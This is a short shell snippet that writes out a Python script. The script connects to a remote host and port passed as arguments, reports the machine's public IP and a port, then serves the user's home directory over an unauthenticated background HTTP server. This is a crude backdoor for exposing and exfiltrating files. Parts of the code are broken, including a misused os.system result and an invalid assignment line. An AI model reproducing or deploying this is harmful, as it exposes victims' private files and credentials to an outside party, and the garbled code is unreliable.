echo "
import os,socket
s = socket.socket()
s.connect(('$1',$2))
def rg():
	op = os.system('curl ifconfig.co')
	ops = op.read()
	return ops
s.send(rg()+'$3')
s.close()
def glop():
	por = os.popen('echo $HOME')
	rt = por.read()
	return rt
glop() = c
d = c.replace('\n','')
os.chdir(d)

os.system('nohup python2 -m SimpleHTTPServer $3 &')
">$4
